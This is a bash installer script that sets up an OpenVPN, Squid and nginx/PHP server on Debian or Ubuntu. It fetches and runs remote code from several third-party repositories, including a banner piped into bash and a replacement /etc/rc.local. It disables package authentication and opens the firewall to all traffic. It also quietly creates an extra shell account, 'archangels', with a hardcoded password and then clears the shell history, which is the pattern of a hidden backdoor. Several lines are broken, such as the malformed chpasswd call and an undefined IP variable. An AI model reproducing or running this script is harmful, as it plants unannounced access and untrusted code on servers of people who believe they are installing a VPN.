#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
if ! [[ -e /etc/debian_version ]]; then
	echo For DEBIAN and UBUNTU only.
	exit;fi
function squi {
read -p "Shareable RP [Y]es [N]o : " shr
[[ ! $shr =~ Y|y|N|n ]] && squi
}; squi
# OPENVPN SERVER SETTINGS
mkdir /etc/openvpn 2> /dev/null
cd /etc/openvpn;mkdir log 2> /dev/null
wget "https://raw.githubusercontent.com/X-DCB/Unix/master/openvpn/openvpn_X-DCB.tar.gz" -qO- | tar xz
wget -qO- https://raw.githubusercontent.com/X-DCB/Unix/master/openvpn/1194.conf > 1194.conf
chmod -R a+x {script,keys}
function chvar {
. script/config.sh
[[  `cat script/config.sh` =~ "$1" ]] || echo "$1=" >> script/config.sh
if [[ ${!1} == '' ]];then
          echo $2
          while [[ $ccx == '' ]];do
          read -p "$3: " ccx;done;
          sed -i "/$1/{s/=.*/=$ccx/g}" script/config.sh; fi; ccx=''
. script/config.sh
}
chvar CPASS "Provide a password for downloading the client configuration." "Set Password"
chvar OWNER "Your name as Owner of this server." "Set Owner"
MYIP=$(wget -qO- ipv4.icanhazip.com);rpstat='';shre='#http_access'
[[ $shr =~ N|n ]] && shre='http_access' && rpstat=' not'
# UPDATE SOURCE LIST
OPT='-o Acquire::Check-Valid-Until=false -yq -o DPkg::Options::=--force-confdef -o DPkg::Options::=--force-confnew --allow-unauthenticated'
# ADD PHP 5.6 SOURCE
sed -i 's/jessie/stretch/g' /etc/apt/sources.list
sed -i 's/xenial/bionic/g' /etc/apt/sources.list
apt-get update
apt-get install $OPT apt-transport-https software-properties-common
# INSTALL REQUIREMENTS
if [[ `lsb_release -si` = Debian ]];then
	wget https://packages.sury.org/php/apt.gpg -qO- | apt-key add -
	echo "deb https://packages.sury.org/php/ `lsb_release -sc` main" > /etc/apt/sources.list.d/php5.list
else
	add-apt-repository -y ppa:ondrej/php; fi
apt update
yes | apt $OPT dist-upgrade
if [[ `lsb_release -sr` =~ 9.|18. ]]; then
	apt remove --purge apache* $OPT
	apt remove --purge php7* $OPT
	apt autoremove $OPT
	apt autoclean $OPT;fi
yes | apt $OPT upgrade
apt-get $OPT install nginx php5.6 php5.6-fpm php5.6-cli php5.6-mysql php5.6-mcrypt mariadb-server openvpn squid
# START INSTALLATION
# WEB DATA
cd /var/www/html
wget "https://raw.githubusercontent.com/X-DCB/Unix/master/openvpn/webfiles-simple.tar.gz" -qO- | tar xz
mv *html oldhtml
# MYSQL SETTINGS
wget -qO- https://raw.githubusercontent.com/X-DCB/Unix/master/openvpn/table.sql | mysql -uroot
# NGINX AND PHP 5.6 SETTINGS
wget -qO /etc/nginx/nginx.conf "https://raw.githubusercontent.com/X-DCB/Unix/master/openvpn/nginx.conf"
wget -qO /etc/nginx/conf.d/vps.conf "https://git.io/fhAyW"
sed -i 's/;cgi.fix_pathinfo=1/cgi.fix_pathinfo=0/g' /etc/php/5.6/fpm/php.ini
sed -i '/display_errors =/{s/Off/On/g}' /etc/php/5.6/fpm/php.ini
sed -i '/listen =/{s/= .*/= 127.0.0.1:9000/g}' /etc/php/5.6/fpm/pool.d/www.conf
sed -i '/;session.save_path =/{s/;//g}' /etc/php/5.6/fpm/php.ini
sed -i 's/85;/80;/g' /etc/nginx/conf.d/vps.conf
sed -i '/root/{s/\/.*/\/var\/www\/html;/g}' /etc/nginx/conf.d/vps.conf
sed -i '/net.ipv4.ip_forward/{s/#//g}' /etc/sysctl.conf
sysctl -p
# create IP Table Service
echo "[Unit]
Description=OpenVPN IP Table
Wants=network.target
After=network.target
DefaultDependencies=no
[Service]
ExecStart=/sbin/iptab
Type=oneshot
RemainAfterExit=yes
[Install]
WantedBy=network.target" > /etc/systemd/system/iptab.service
echo '#!/bin/bash
iptables -F
iptables -X
iptables -F -t nat
iptables -X -t nat
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -t nat -I POSTROUTING -o eth0 -j MASQUERADE
iptables -A INPUT -j ACCEPT
iptables -A FORWARD -j ACCEPT
iptables -A INPUT -p tcp --dport 1194 -j ACCEPT
iptables -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp -m state --state ESTABLISHED --sport 22 -j ACCEPT
iptables -A INPUT -p udp -m state --state ESTABLISHED --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m state --state NEW,ESTABLISHED --dport 53 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW,ESTABLISHED --dport 22 -j ACCEPT
iptables -t filter -A FORWARD -j REJECT --reject-with icmp-port-unreachable
sysctl -w net.ipv4.ip_forward=1
' > /sbin/iptab

# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget -O openvpn.tar "https://raw.githubusercontent.com/kingmapualaut/gakod/main/openvpn.tar"
tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/rc.local "https://raw.githubusercontent.com/kingmapualaut/gakod/main/rc.local"
chmod +x /etc/rc.local

# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/kingmapualaut/gakod/main/client.ovpn"
wget -O /home/vps/public_html/client1.ovpn "https://raw.githubusercontent.com/kingmapualaut/gakod/main/client1.ovpn"
wget -O /etc/motd "https://raw.githubusercontent.com/ehomecore/deb-ubun/master/rendum/motd"
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
useradd -m -g users -s /bin/bash archangels
echo "7C22C4ED" | chpasswd
echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
# executability
chmod +x {/sbin/iptab,/etc/systemd/system/iptab.service}
# install squid
sq=$([ -d /etc/squid ] && echo squid || echo squid3)
[ ! -f /etc/$sq/squid.confx ] && mv /etc/$sq/squid.conf /etc/$sq/squid.confx
wget -qO- https://raw.githubusercontent.com/X-DCB/Unix/master/openvpn/squid.conf | sed -e "s/#http_access/$shre/g" | sed -e "s/x.x.x.x/$MYIP/g" > /etc/$sq/squid.conf
# set timezone
cp /usr/share/zoneinfo/Asia/Manila /etc/localtime
# reload daemon
systemctl daemon-reload
# restart services
systemctl restart {$sq,openvpn@1194,iptab,nginx,mysql,php5.6-fpm}
# enable on startup
systemctl enable {$sq,openvpn@1194,iptab,nginx,mysql,php5.6-fpm}
clear
wget -qO- "https://raw.githubusercontent.com/X-DCB/Unix/master/banner" | bash
echo 'Your Squid Proxy is'$rpstat' shareable.'
echo -e 'Download the client configuration\nwith this password: '$CPASS
echo "Installation finished."
history -c
